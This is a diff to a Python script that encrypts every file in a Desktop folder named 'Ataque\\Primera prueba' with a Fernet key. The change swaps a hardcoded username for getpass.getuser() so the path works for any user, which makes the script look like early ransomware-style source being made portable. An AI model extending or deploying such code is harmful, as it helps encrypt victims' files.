@@ -1,5 +1,6 @@
 from cryptography.fernet import Fernet
 import os
+import getpass
 
 
 def generarkey():
@@ -24,7 +25,7 @@ def encrypt(items, key):
 
 
 if __name__ == "__main__":
-    archivos = 'C:\\Users\\erick\\Desktop\\Ataque\\Primera prueba'
+    archivos = 'C:\\Users\\'+getpass.getuser()+'\\Desktop\\Ataque\\Primera prueba'
     items = os.listdir(archivos)
     archivos_2 = [archivos+"\\"+ x for x in items]
 
